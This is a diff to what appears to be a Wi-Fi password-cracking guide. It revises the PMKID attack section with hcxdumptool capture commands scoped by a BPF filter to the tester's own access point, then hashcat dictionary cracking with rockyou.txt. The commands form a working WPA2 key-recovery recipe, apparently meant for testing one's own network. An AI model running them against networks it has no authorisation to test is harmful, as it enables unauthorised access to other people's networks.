@@ -105,7 +105,10 @@ hashcat -m 22000 hs.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ## PMKID attack (clientless, no deauth)
 
 ```bash
-sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+sudo systemctl stop NetworkManager wpa_supplicant      # hcxdumptool owns the radio
+hcxdumptool --bpfc="wlan addr3 112233445566" > scope.bpf   # only YOUR AP's BSSID
+sudo hcxdumptool -i wlan0 -w pmkid.pcapng -c 6a --bpf=scope.bpf --rds=1   # managed iface, not wlan0mon
+sudo systemctl start NetworkManager wpa_supplicant
 hcxpcapngtool -o pmkid.22000 pmkid.pcapng
 hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
 ```
